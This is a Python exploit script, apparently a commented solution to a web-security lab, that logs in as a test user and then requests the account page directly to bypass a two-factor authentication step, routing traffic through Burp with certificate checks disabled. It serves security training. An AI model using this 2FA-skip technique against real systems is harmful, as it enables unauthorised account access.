import requests         
import sys              
import urllib3           # Used to disable SSL certificate warnings

# Disable warnings that appear when verify=False is used
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Tell the requests library to send all traffic through Burp Suite
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}


# Function: Performs the exploit
# -----------------------------
# This function needs two things:
# s   -> a Session object (stores cookies)
# url -> target lab URL
def access_carlos_account(s, url):

    print("(+) Logging into Carlos account and bypassing 2FA")

    # Create login endpoint
    login_url = url + "/login"

    # Data that will be sent in the POST request
    login_data = {
        "username": "carlos",
        "password": "montoya"
    }

    # Send login request
   
    # This request is sent using "s" (the Session object).
    # Because of that, any session cookie returned by the server
    # will automatically be stored inside "s".
    s.post(
        login_url,
        data=login_data,
        allow_redirects=False,
        verify=False,
        proxies=proxies
    )

    # Create protected page URL
    myaccount_url = url + "/my-account"

    # Send another request USING THE SAME SESSION.
    # Because we're using the same "s",
    # the previously stored session cookie is sent automatically.
    r = s.get(
        myaccount_url,
        verify=False,
        proxies=proxies
    )

    # Check if login succeeded.
    # If "Log out" exists on the page,
    # we're most likely logged in.
    if "Log out" in r.text:
        print("(+) Successfully bypassed 2FA")
    else:
        print("(-) Exploit failed")
        sys.exit(-1)


# Program starts here
def main():

    # User must provide exactly one argument:
    # python exploit.py https://lab-url
    if len(sys.argv) != 2:
        print("Usage: python exploit.py <url>")
        sys.exit(-1)

    # Create ONE session.
    # This is extremely important because
    # this session stores cookies.
    s = requests.Session()

    # Read the URL entered by the user.
    url = sys.argv[1]

    # Call the exploit function.
    # Pass BOTH the session and the URL.
    access_carlos_account(s, url)


# Python starts executing here.
# It calls main(), which then calls access_carlos_account().
if __name__ == "__main__":
    main()